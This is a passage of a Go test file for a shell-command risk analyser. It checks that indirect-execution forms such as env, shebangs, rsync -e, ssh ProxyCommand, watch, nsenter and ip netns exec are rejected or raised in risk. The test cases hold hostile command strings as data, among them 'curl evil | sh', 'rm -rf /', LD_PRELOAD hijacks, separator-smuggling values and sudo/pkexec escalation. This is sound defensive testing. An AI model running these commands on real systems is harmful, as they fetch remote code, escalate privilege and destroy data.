	assert.Equal(t, IndirectReject, xargsRes.Kind, "xargs behind a wrapper-named symlink must stay Reject")

	// A "stdbuf"-named symlink pointing at the dynamic loader must be rejected.
	loaderLink := symlinkNamed(t, "stdbuf", "ld-linux-x86-64.so.2")
	loaderRes := analyzeIndirectCmd(loaderLink, "--preload", "/tmp/x.so", "/bin/ls")
	assert.Equal(t, IndirectReject, loaderRes.Kind, "dynamic loader behind a wrapper-named symlink must stay Reject")
}

// TestIndirect_UnextractableWrapperRejected verifies an unextractable wrapper form
// is rejected (not silently downgraded), distinct from the Medium no-command case.
func TestIndirect_UnextractableWrapperRejected(t *testing.T) {
	res := analyzeIndirectCmd("env", "--unknown-flag", "ls")
	assert.Equal(t, IndirectReject, res.Kind)

	// A wrapper whose option parsing mis-locates the command so that the extracted
	// token still begins with "-" fails closed rather than evaluating the wrong
	// token (e.g. an unknown value-taking option consumed the real positional).
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("timeout", "--unknown-val", "5", "-rf").Kind)
	// nice's "-NUM" adjustment is still handled: the real command is extracted.
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("nice", "-10", "rm", "-rf", "/tmp/x").Kind)
	// An unknown long option (--foo) may or may not consume the next token, so
	// the command boundary is unreliable; fail closed even when the extracted
	// token doesn't start with "-" (e.g. --mystery-opt /val sudo).
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("timeout", "--mystery-opt", "/val", "sudo", "ls").Kind)
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("nice", "--mystery-opt", "/val", "sudo", "ls").Kind)

	// Contrast: env with no command is a High floor (redundant-with-config), not Reject.
	noCmd := analyzeIndirectCmd("env", "FOO=bar")
	assert.Equal(t, IndirectFloor, noCmd.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, noCmd.Level)

	// The "--" option terminator is a valid form, not an unknown option: the
	// following token is the command and must still be evaluated, even when the
	// command itself begins with "-".
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "ls").Kind)
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "-weird-cmd").Kind)
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "--also-a-cmd").Kind)
	assert.Equal(t, IndirectCritical, analyzeIndirectCmd("env", "--", "sudo", "ls").Kind)
	// Forbidden assignments after "--" are still caught.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("env", "--", "LD_PRELOAD=/tmp/x.so", "ls").Kind)
}

// TestIndirect_PackageScriptRunnerHigh verifies package script runners are High.
func TestIndirect_PackageScriptRunnerHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"npm run", "npm", []string{"run", "build"}},
		{"npx", "npx", []string{"cowsay", "hi"}},
		{"yarn run", "yarn", []string{"run", "build"}},
		{"pnpm run", "pnpm", []string{"run", "build"}},
		{"pnpm dlx", "pnpm", []string{"dlx", "create-app"}},
		{"npm test lifecycle", "npm", []string{"test"}},
		{"npm start lifecycle", "npm", []string{"start"}},
		{"yarn start lifecycle", "yarn", []string{"start"}},
		{"yarn script shorthand", "yarn", []string{"build"}},
		{"pnpm script shorthand", "pnpm", []string{"deploy"}},
		{"env yarn build wrapped", "env", []string{"yarn", "build"}},
		// An unknown separated option before the verb shifts the parse position, so
		// fail closed (High) rather than miss the hidden "run build" script.
		{"npm unknown sep option", "npm", []string{"--loglevel", "silent", "run", "build"}},
		{"yarn unknown sep option", "yarn", []string{"--frozen-lockfile", "build"}},
		// bun and bunx must be treated the same as yarn/npm/pnpm.
		{"bun run", "bun", []string{"run", "build"}},
		{"bun script shorthand", "bun", []string{"deploy"}},
		{"bunx", "bunx", []string{"create-app"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_ShebangLongLineNotTruncated verifies the shebang read bound is
// large enough to cover macOS's 512-byte kernel shebang limit: an env -S payload
// whose fail-closed trigger (a quote) sits past Linux's 256-byte limit but within
// 512 must still be read and rejected, rather than truncated and allowed.
func TestIndirect_ShebangLongLineNotTruncated(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "deploy.sh")
	// The quote lands at ~byte 323 — beyond 256 (would be truncated under the old
	// Linux-only bound) but within 512.
	shebang := "#!/usr/bin/env -S echo " + strings.Repeat("a", 300) + " 'q'\n"
	require.Greater(t, len(shebang), 256)
	require.LessOrEqual(t, len(shebang), 512)
	require.NoError(t, os.WriteFile(script, []byte(shebang+"echo hi\n"), 0o755))

	// The quote makes the env -S payload uninterpretable -> fail closed (Reject).
	// A 256-byte cap would truncate before the quote and mis-classify it as Floor.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd(script).Kind,
		"a quote past byte 256 in the shebang env -S payload must still trigger fail-closed")
}

// TestIndirect_ShebangInterpreterGated verifies a direct script with a shebang is
// evaluated through its interpreter chain. Role propagation means an env-based
// shebang (#!/usr/bin/env python) records both env and the real interpreter
// (python) as RoleInterpreter, since the whole chain is evaluated as the
// interpreter rather than as a wrapper inner.
func TestIndirect_ShebangInterpreterGated(t *testing.T) {
	cases := []struct {
		name       string
		shebang    string
		wantInterp int
	}{
		{"env python", "#!/usr/bin/env python\n", 2}, // env + python both RoleInterpreter
		{"bin sh", "#!/bin/sh\n", 1},
		{"bin bash", "#!/bin/bash -e\n", 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			script := filepath.Join(dir, "deploy.sh")
			require.NoError(t, os.WriteFile(script, []byte(tc.shebang+"echo hi\n"), 0o755))

			res := analyzeIndirectCmd(script)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			interp := 0
			for _, a := range res.Artifacts {
				if a.Role == risktypes.RoleInterpreter {
					interp++
				}
			}
			assert.Equal(t, tc.wantInterp, interp, "shebang interpreter chain must be recorded as RoleInterpreter")
		})
	}

	// A script whose basename matches a wrapper (e.g. "env") must be evaluated
	// through its shebang interpreter chain, not as the wrapper.
	t.Run("script named env takes shebang over wrapper match", func(t *testing.T) {
		dir := t.TempDir()
		script := filepath.Join(dir, "env") // basename == "env"
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/python3\nprint('hi')\n"), 0o755))
		res := analyzeIndirectCmd(script)
		assert.Equal(t, IndirectFloor, res.Kind, "shebang must win over wrapper basename match")
		interpCount := 0
		for _, a := range res.Artifacts {
			if a.Role == risktypes.RoleInterpreter {
				interpCount++
			}
		}
		assert.Equal(t, 1, interpCount, "shebang interpreter must be recorded exactly once")
	})

	// A non-shebang file (regular ELF-like content) is not an indirect form.
	dir := t.TempDir()
	bin := filepath.Join(dir, "tool")
	require.NoError(t, os.WriteFile(bin, []byte{0x7f, 'E', 'L', 'F', 0, 0}, 0o755))
	assert.Equal(t, IndirectNone, analyzeIndirectCmd(bin).Kind)

	// A "#!/usr/bin/env -S ..." shebang carries the whole remainder as ONE optional
	// argument (Linux does not split it further). The env -S payload here contains
	// a quote, which env -S would process, so it must fail closed (Reject) — and it
	// must NOT be split into separate argv tokens, which would move the quote out of
	// the -S payload and let the dangerous "rm -rf /" through.
	t.Run("env -S shebang with quoting fails closed", func(t *testing.T) {
		sdir := t.TempDir()
		script := filepath.Join(sdir, "deploy.sh")
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/env -S rm '-rf' /\n"), 0o755))
		assert.Equal(t, IndirectReject, analyzeIndirectCmd(script).Kind,
			"env -S payload with a quote must be rejected, not split into separate tokens")
	})

	// The same shebang form without any special characters is interpreted: the
	// single optional-arg token "-S echo hi" splits cleanly to "echo" + "hi".
	t.Run("env -S shebang plain payload is interpreted", func(t *testing.T) {
		sdir := t.TempDir()
		script := filepath.Join(sdir, "deploy.sh")
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/env -S echo hi\n"), 0o755))
		assert.NotEqual(t, IndirectReject, analyzeIndirectCmd(script).Kind,
			"a plain -S payload must still be interpreted, not rejected")
	})
}

// TestIndirect_EnvShebangInterpreterNotFlattened verifies role propagation keeps
// the env-based shebang form (#!/usr/bin/env <interp>) out of the flat-High
// collapse: a direct script execution evaluates its interpreter chain as
// RoleInterpreter even though it passes through env, so a benign interpreter is not
// promoted to High while an arbitrary-code interpreter stays High.
func TestIndirect_EnvShebangInterpreterNotFlattened(t *testing.T) {
	// A benign interpreter (cat is not an arbitrary-code runner) must not be promoted
	// to High by the wrapper-inner flattening: the interpreter chain stays
	// RoleInterpreter (fine-grained) all the way through env.
	t.Run("benign env interpreter not promoted", func(t *testing.T) {
		dir := t.TempDir()
		script := filepath.Join(dir, "benign.sh")
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/env cat\nhi\n"), 0o755))
		res := analyzeIndirectCmd(script)
		assert.Less(t, res.Level, runnertypes.RiskLevelHigh,
			"a benign env-shebang interpreter must keep its fine-grained (sub-High) level")
	})

	// An arbitrary-code interpreter reached through env stays High via the
	// fine-grained IsArbitraryCodeExecutionRunner check (unchanged behavior).
	t.Run("arbitrary-code env interpreter stays High", func(t *testing.T) {
		dir := t.TempDir()
		script := filepath.Join(dir, "py.sh")
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/env python\nprint('hi')\n"), 0o755))
		res := analyzeIndirectCmd(script)
		assert.Equal(t, IndirectFloor, res.Kind)
		assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
	})
}

// TestIndirect_CommandExecOptionsGated verifies the helper-execution options that
// run a local command. rsync -e/--rsh and ssh -o ProxyCommand/LocalCommand extract
// the helper command string and gate it (High floor, Critical for a privilege
// token, Reject for a value that cannot be safely split); tar's child-process
// helpers remain a flat Reject.
func TestIndirect_CommandExecOptionsGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
		// level is asserted only when want is IndirectFloor (the extractable forms),
		// to distinguish a High floor from the Critical privilege case.
		level runnertypes.RiskLevel
	}{
		// rsync -e/--rsh: the helper command string is extracted and gated to a High
		// floor (extracted and gated rather than rejected). The getopt value-binding
		// forms (separated, attached, bundle-end, attached-long) are all covered.
		{"rsync -e", "rsync", []string{"-e", "ssh -p 22", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"rsync --rsh=", "rsync", []string{"--rsh=ssh", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"rsync -essh attached", "rsync", []string{"-essh", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"rsync -avze bundle end", "rsync", []string{"-avze", "ssh", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// Mid-bundle: -e is not the last letter, so its value is the token remainder
		// ("vz"), NOT the next token. Reading the next token here would mis-extract
		// "src" (a path operand) and under-gate. Gating "vz" as a (bogus) command name
		// still yields a High floor, locking the remainder-precedence rule.
		{"rsync -aevz mid-bundle", "rsync", []string{"-aevz", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// A privilege token inside the helper string is Critical.
		{"rsync -e sudo", "rsync", []string{"-e", "sudo cmd", "src", "dst"}, IndirectCritical, 0},
		// A safe-set-only value (no shell metacharacters) is split cleanly and gated.
		{"rsync -e safe proxy chain", "rsync", []string{"-e", "nc -X connect -x proxy:3128 %h %p", "src", "dst"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// A value with shell metacharacters cannot be split faithfully -> Reject.
		{"rsync -e separator", "rsync", []string{"-e", "ssh; rm -rf /", "src", "dst"}, IndirectReject, 0},
		{"rsync -e substitution", "rsync", []string{"-e", "$(printf sudo)", "src", "dst"}, IndirectReject, 0},
		{"rsync -e subshell", "rsync", []string{"-e", "(sudo id)", "src", "dst"}, IndirectReject, 0},
		{"rsync -e newline", "rsync", []string{"-e", "ssh\nsudo id", "src", "dst"}, IndirectReject, 0},
		// An -e/--rsh option present but with no value token cannot be extracted -> Reject.
		{"rsync -e no value", "rsync", []string{"-e"}, IndirectReject, 0},
		// A plain rsync with no -e/--rsh is left to the normal (Medium) classification.
		{"rsync plain", "rsync", []string{"src", "dst"}, IndirectNone, 0},
		// ssh -o ProxyCommand/LocalCommand: the helper command string is extracted and
		// gated. ProxyCommand and LocalCommand are verified symmetrically so neither is
		// left unchecked. The keyword is case-insensitive.
		{"ssh -o ProxyCommand=", "ssh", []string{"-o", "ProxyCommand=ssh -W %h:%p bastion", "host"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"ssh -o ProxyCommand space", "ssh", []string{"-o", "ProxyCommand ssh -W %h:%p bastion", "host"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"ssh -oProxyCommand attached", "ssh", []string{"-oProxyCommand=ssh -W %h:%p bastion", "host"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"ssh -o LocalCommand sudo", "ssh", []string{"-o", "LocalCommand=sudo id", "host"}, IndirectCritical, 0},
		{"ssh -o proxycommand lowercase sudo", "ssh", []string{"-o", "proxycommand=sudo id", "host"}, IndirectCritical, 0},
		{"ssh -o LocalCommand separator", "ssh", []string{"-o", "LocalCommand=nc %h %p; modprobe x", "host"}, IndirectReject, 0},
		{"ssh -o ProxyCommand subshell", "ssh", []string{"-o", "ProxyCommand={ sudo id; }", "host"}, IndirectReject, 0},
		{"ssh -o ProxyCommand newline", "ssh", []string{"-o", "ProxyCommand=ssh\nsudo id", "host"}, IndirectReject, 0},
		// A plain ssh with no ProxyCommand/LocalCommand option is left to Medium.
		{"ssh plain", "ssh", []string{"-p", "22", "host"}, IndirectNone, 0},
		{"ssh -o unrelated option", "ssh", []string{"-o", "StrictHostKeyChecking=no", "host"}, IndirectNone, 0},
		// tar's child-process helpers stay a flat Reject (their command string cannot
		// be safely extracted from tar's archive processing).
		{"tar --to-command=", "tar", []string{"--to-command=/tmp/x", "-cf", "a.tar", "."}, IndirectReject, 0},
		{"tar --checkpoint-action=", "tar", []string{"--checkpoint-action=exec=sh", "-cf", "a.tar", "."}, IndirectReject, 0},
		{"tar plain", "tar", []string{"-cf", "a.tar", "."}, IndirectNone, 0},
		// The "--" terminator ends option scanning: an operand that looks like a
		// helper option (e.g. a destination literally named "-e") must not be
		// rejected as a remote-shell form.
		{"rsync -- -e operand", "rsync", []string{"--", "-e", "dst"}, IndirectNone, 0},
		{"tar -- --to-command operand", "tar", []string{"-cf", "a.tar", "--", "--to-command"}, IndirectNone, 0},
		// A value-taking option's value that looks like a helper flag must not be
		// matched as the helper: here "--to-command" is the directory argument to
		// tar -C, not the helper option.
		{"tar -C value looks like helper", "tar", []string{"-C", "--to-command", "-cf", "a.tar", "."}, IndirectNone, 0},
		{"tar -f value looks like helper", "tar", []string{"-f", "--checkpoint-action", "-c", "."}, IndirectNone, 0},
		// But the genuine helper option in a normal position is still rejected.
		{"tar --to-command genuine", "tar", []string{"--to-command", "/tmp/x", "-cf", "a.tar", "."}, IndirectReject, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
			if tc.want == IndirectFloor {
				assert.Equal(t, tc.level, res.Level)
			}
		})
	}
}

// TestIndirect_ServiceInitScriptGated verifies the SysV init script behind a
// service command is recorded as a chain artifact and the form stays High.
func TestIndirect_ServiceInitScriptGated(t *testing.T) {
	res := analyzeIndirectCmd("service", "nginx", "start")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)

	require.NotEmpty(t, res.Artifacts)
	assert.Equal(t, "/etc/init.d/nginx", res.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, res.Artifacts[0].Role)

	// A read-only action also runs the init script, so it is also gated/High.
	status := analyzeIndirectCmd("service", "nginx", "status")
	assert.Equal(t, runnertypes.RiskLevelHigh, status.Level)

	// An option-only form has no extractable unit, so the init script cannot be
	// identified or gated -> fail closed.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("service", "--status-all").Kind)

	// A unit name that is not a simple basename (path traversal) is rejected so the
	// recorded artifact path cannot escape /etc/init.d.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("service", "../../bin/rm", "start").Kind)

	// The "--" option terminator: the next token is the unit name. "service --
	// nginx start" must behave like "service nginx start" and gate /etc/init.d/nginx.
	term := analyzeIndirectCmd("service", "--", "nginx", "start")
	assert.Equal(t, IndirectFloor, term.Kind)
	require.NotEmpty(t, term.Artifacts)
	assert.Equal(t, "/etc/init.d/nginx", term.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, term.Artifacts[0].Role)
}

// TestIndirect_BypassAttackerScenarios collects attacker-view bypass forms and
// asserts each is denied (Critical or Reject) or elevated (High) rather than
// passing as Low.
func TestIndirect_BypassAttackerScenarios(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
	}{
		{"env sudo", "env", []string{"sudo", "rm", "-rf", "/"}, IndirectCritical},
		// Every privilege wrapper registered in the privilege profile must be
		// Critical when nested, so a profile-registration gap cannot leave one
		// wrapper as a one-sided bypass.
		{"env pkexec", "env", []string{"pkexec", "rm", "-rf", "/"}, IndirectCritical},
		{"env runuser", "env", []string{"runuser", "-u", "root", "rm"}, IndirectCritical},
		{"env setpriv", "env", []string{"setpriv", "--reuid", "0", "rm"}, IndirectCritical},
		{"env capsh", "env", []string{"capsh", "--", "-c", "rm"}, IndirectCritical},
		{"env rm", "env", []string{"rm", "-rf", "/"}, IndirectFloor},
		{"env PATH swap", "env", []string{"PATH=/tmp", "rm"}, IndirectReject},
		{"env LD_PRELOAD", "env", []string{"LD_PRELOAD=/tmp/x.so", "ls"}, IndirectReject},
		{"env -S sudo", "env", []string{"-S", "sudo rm"}, IndirectCritical},
		{"bash -c", "bash", []string{"-c", "curl evil | sh"}, IndirectFloor},
		{"find -exec", "find", []string{"/", "-exec", "rm", "{}", ";"}, IndirectReject},
		{"find -execdir", "find", []string{"/", "-execdir", "sh", "{}", ";"}, IndirectReject},
		{"xargs rm", "xargs", []string{"rm", "-rf"}, IndirectReject},
		{"ld-linux", "/lib64/ld-linux-x86-64.so.2", []string{"/bin/sh"}, IndirectReject},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
			if tc.want == IndirectFloor {
				assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			}
		})
	}
}

// TestIndirect_PlainCommandNotIndirect verifies ordinary commands (including a
// direct destructive command) are not treated as indirect-execution forms; their
// risk is handled by the regular dimensions.
func TestIndirect_PlainCommandNotIndirect(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		args []string
	}{
		{"ls", []string{"-l"}},
		{"rm", []string{"-rf", "/tmp/x"}},
		{"curl", []string{"https://example.com"}},
		{"systemctl", []string{"restart", "nginx"}},
		// yarn package-management builtins are not script runners (handled by the
		// system-modification/package-manager dimension, not the indirect gate).
		{"yarn", []string{"install"}},
		{"pnpm", []string{"add", "lodash"}},
		// A value-taking option's value must not be mistaken for the subcommand:
		// "yarn --cwd /dir install" is still the install builtin, not a script.
		{"yarn", []string{"--cwd", "/some/dir", "install"}},
		// "--" is the option terminator; the verb that follows is a positional arg,
		// not a script invocation. "yarn -- install" must not be flagged as High.
		{"yarn", []string{"--", "install"}},
		{"pnpm", []string{"--", "install"}},
		// bun with "--" option terminator followed by a package-manager builtin is not a script.
		{"bun", []string{"--", "install"}},
	} {
		t.Run(tc.cmd, func(t *testing.T) {
			assert.Equal(t, IndirectNone, analyzeIndirectCmd(tc.cmd, tc.args...).Kind)
		})
	}
}

// TestIndirect_NamespaceWrappersGated verifies the namespace/root-change and
// command-string wrappers (chroot/unshare/nsenter/flock/watch) gate their inner
// command: a privilege token inside is Critical, an ordinary inner command is at
// least a High floor, and an unextractable form is rejected. Option-skipping
// regressions (a value-option's value, an optional-argument's separated operand,
// the watch operand concatenation) are folded in so an inner command is neither
// missed nor mis-located.
func TestIndirect_NamespaceWrappersGated(t *testing.T) {
	cases := []struct {
		name      string
		cmd       string
		args      []string
		wantKind  IndirectExecutionKind
		wantLevel runnertypes.RiskLevel // only checked when wantKind is IndirectFloor
	}{
		// chroot: NEWROOT positional is skipped, then the COMMAND is gated.
		{"chroot inner destructive", "chroot", []string{"/mnt", "rm", "-rf", "/"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// chroot's NEWROOT is mandatory: an option-only form with no NEWROOT is
		// malformed (not a no-command implicit shell) and fails closed.
		{"chroot missing newroot reject", "chroot", []string{"--skip-chdir"}, IndirectReject, 0},
		{"chroot userspec attached then privilege", "chroot", []string{"--userspec=0:0", "/mnt", "sudo", "id"}, IndirectCritical, 0},
		{"chroot userspec separated then privilege", "chroot", []string{"--userspec", "0:0", "/mnt", "sudo", "id"}, IndirectCritical, 0},
		// unshare: -w/-S/-G consume a value; -m (optional-argument) and -r (flag) do not.
		{"unshare -r modprobe", "unshare", []string{"-r", "modprobe", "x"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"unshare -m optional-arg privilege", "unshare", []string{"-m", "sudo", "id"}, IndirectCritical, 0},
		{"unshare -w value privilege", "unshare", []string{"-w", "/tmp", "sudo", "id"}, IndirectCritical, 0},
		{"unshare -r flag privilege", "unshare", []string{"-r", "sudo", "id"}, IndirectCritical, 0},
		// --map-users/--map-groups take a REQUIRED value (verified against the real
		// tool: "unshare --map-users sudoXYZ" reports "invalid mapping 'sudoXYZ'", so
		// the token is consumed as the mapping spec, not treated as the command).
		// They therefore belong in valueOpts: the value is consumed and the following
		// "sudo" is the gated inner command. Misclassifying them as optional-argument
		// would skip the value, treat "0:0:1" as the command, and miss "sudo".
		{"unshare --map-users value privilege", "unshare", []string{"--map-users", "0:0:1", "sudo", "id"}, IndirectCritical, 0},
		{"unshare --map-groups value privilege", "unshare", []string{"--map-groups", "0:0:1", "sudo", "id"}, IndirectCritical, 0},
		// nsenter: -t/-S consume a value; -m/-w (optional-argument) do not.
		{"nsenter -t value then sh", "nsenter", []string{"-t", "1", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"nsenter -m optional-arg privilege", "nsenter", []string{"-m", "sudo", "id"}, IndirectCritical, 0},
		{"nsenter -t value -w optional-arg privilege", "nsenter", []string{"-t", "1", "-w", "sudo", "id"}, IndirectCritical, 0},
		// Value-option coverage: -S consumes "0", so sh (not 0) is the gated command.
		{"nsenter -S value then sh", "nsenter", []string{"-S", "0", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// Clustered optional-argument + value-option is ambiguous (the real tools
		// disagree on whether "-rS"/"-mS" binds "S" to -r/-m as an attached value or
		// parses -S separately), so the scan fails closed rather than risk swallowing
		// the inner command ("sudo") as -S's value.
		{"nsenter -rS cluster ambiguous reject", "nsenter", []string{"-rS", "sudo", "id"}, IndirectReject, 0},
		{"nsenter -mS cluster ambiguous reject", "nsenter", []string{"-mS", "sudo", "id"}, IndirectReject, 0},
		{"unshare -mS cluster ambiguous reject", "unshare", []string{"-mS", "sudo", "id"}, IndirectReject, 0},
		// flock: -w consumes a value, the lock operand is skipped, then the command.
		{"flock -w value lock then privilege", "flock", []string{"-w", "10", "/tmp/l", "sudo", "id"}, IndirectCritical, 0},
		{"flock -c command string privilege", "flock", []string{"/tmp/l", "-c", "sudo id"}, IndirectCritical, 0},
		// flock's -c command string goes through the fail-closed allowlist split: a
		// shell separator or newline cannot be faithfully tokenized, so it is rejected
		// rather than gating only the first token and dropping the hidden command.
		{"flock -c separator reject", "flock", []string{"/tmp/l", "-c", "sudo; id"}, IndirectReject, 0},
		{"flock -c newline reject", "flock", []string{"/tmp/l", "-c", "sudo\nid"}, IndirectReject, 0},
		{"flock fd-only form", "flock", []string{"9"}, IndirectNone, 0},
		{"flock argv generic inner", "flock", []string{"f", "cmd"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// watch without -x joins all operands into one /bin/sh -c string.
		{"watch privilege", "watch", []string{"sudo", "id"}, IndirectCritical, 0},
		{"watch -n value privilege", "watch", []string{"-n", "1", "sudo", "id"}, IndirectCritical, 0},
		{"watch -q value privilege", "watch", []string{"-q", "1", "sudo", "id"}, IndirectCritical, 0},
		{"watch -c color flag privilege", "watch", []string{"-c", "sudo", "id"}, IndirectCritical, 0},
		{"watch generic inner", "watch", []string{"cmd"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// watch operand concatenation: a ";" between operands hides "sudo id", so the
		// joined string contains a shell separator and fails closed.
		{"watch concat shell separator reject", "watch", []string{"ls", "-l", ";", "sudo", "id"}, IndirectReject, 0},
		// A newline in the joined operand string is also outside the safe set, so the
		// fail-closed split rejects it rather than gating only the first line.
		{"watch concat newline reject", "watch", []string{"ls\nsudo id"}, IndirectReject, 0},
		// watch -x runs the operands as an argv list (no /bin/sh -c), so "-n" after
		// the command is the inner command's argument, not watch's option.
		{"watch -x argv destructive", "watch", []string{"-x", "rm", "-rf", "/"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"watch -x argv privilege", "watch", []string{"-x", "sudo", "-n", "1"}, IndirectCritical, 0},
		// "-x" clustered with the interval flag still enables exec mode.
		{"watch -xn exec with interval privilege", "watch", []string{"-xn", "1", "sudo"}, IndirectCritical, 0},
		// "-nx" is -n with attached value "x", NOT the -x exec flag, so watch stays in
		// command-string mode and the ";" hidden among the operands fails closed.
		{"watch -nx attached value not exec mode reject", "watch", []string{"-nx", "ls", "-l", ";", "sudo", "id"}, IndirectReject, 0},
		// "-dx" is -d (--differences, optional-argument) with attached value "x", NOT
		// the -x exec flag, so the same fail-closed split applies.
		{"watch -dx attached value not exec mode reject", "watch", []string{"-dx", "ls", "-l", ";", "sudo", "id"}, IndirectReject, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.wantKind, res.Kind)
			if tc.wantKind == IndirectFloor {
				assert.Equal(t, tc.wantLevel, res.Level)
			}
		})
	}
}

// TestIndirect_NoCommandImplicitShellHigh verifies the namespace/root-change
// wrappers return a High floor (not the generic wrapper Medium) when no inner
// command is given: these tools launch an implicit shell, so a namespace/privilege
// escape must not pass unevaluated.
func TestIndirect_NoCommandImplicitShellHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"chroot newroot only", "chroot", []string{"/mnt"}},
		{"unshare bare", "unshare", nil},
		{"nsenter target and mount, no command", "nsenter", []string{"-t", "1", "-m"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_IpExecGated verifies "ip netns exec" / "ip vrf exec" gate their
// inner command, that ip's global options are skipped (in singleDashLong mode) so
// an inserted global cannot shift the object word and bypass the gate, and that a
// non-exec ip subcommand is left to the normal ip (Medium) classification rather
// than treated as indirect execution.
func TestIndirect_IpExecGated(t *testing.T) {
	cases := []struct {
		name      string
		args      []string
		wantKind  IndirectExecutionKind
		wantLevel runnertypes.RiskLevel // only checked when wantKind is IndirectFloor
	}{
		// The inner command of an exec form is gated at least to a High floor.
		{"netns exec destructive inner", []string{"netns", "exec", "ns", "rm", "-rf", "/"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"netns exec system-modification inner", []string{"netns", "exec", "ns", "modprobe", "x"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"vrf exec inner", []string{"vrf", "exec", "v", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// A privilege token inside the namespace is Critical (both objects share code).
		{"netns exec privilege inner", []string{"netns", "exec", "ns", "sudo", "id"}, IndirectCritical, 0},
		{"vrf exec privilege inner", []string{"vrf", "exec", "v", "sudo", "id"}, IndirectCritical, 0},
		// Global option insertion must not bypass the inner gate: a "-json" flag and a
		// "-n NAME" value-option before the object word are skipped, not mistaken for
		// the object.
		{"global flag before netns exec", []string{"-json", "netns", "exec", "ns", "rm", "-rf", "/"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"global value-option before netns exec", []string{"-n", "foo", "netns", "exec", "ns", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// -color/-c is a flag (iproute2 -c[olor][={always|auto|never}]): bare -color
		// does NOT consume the next token, so the object word is still found and the
		// inner command is gated. Listing -color in valueOpts would swallow "netns"
		// here and miss the gate, so these lock the flag classification.
		{"global bare color flag before netns exec", []string{"-color", "netns", "exec", "ns", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		{"global short color flag before netns exec", []string{"-c", "netns", "exec", "ns", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// The color value binds only in the attached "=" form, handled as a
		// self-contained option, so the object word is still located.
		{"global color attached value before netns exec", []string{"-color=always", "netns", "exec", "ns", "sh"}, IndirectFloor, runnertypes.RiskLevelHigh},
		// Bare -color does not consume "always": "always" becomes the (in real ip,
		// invalid) object word, so this is not an exec form and delegates to ip Medium
		// — consistent with real ip rejecting object "always" and executing nothing.
		{"global bare color does not consume next token", []string{"-color", "always", "netns", "exec", "ns", "sh"}, IndirectNone, 0},
		// An exec form whose inner command (or NAME) is missing fails closed; both the
		// "no NAME" and "NAME present but no command" branches, for both objects.
		{"netns exec missing inner reject", []string{"netns", "exec", "ns"}, IndirectReject, 0},
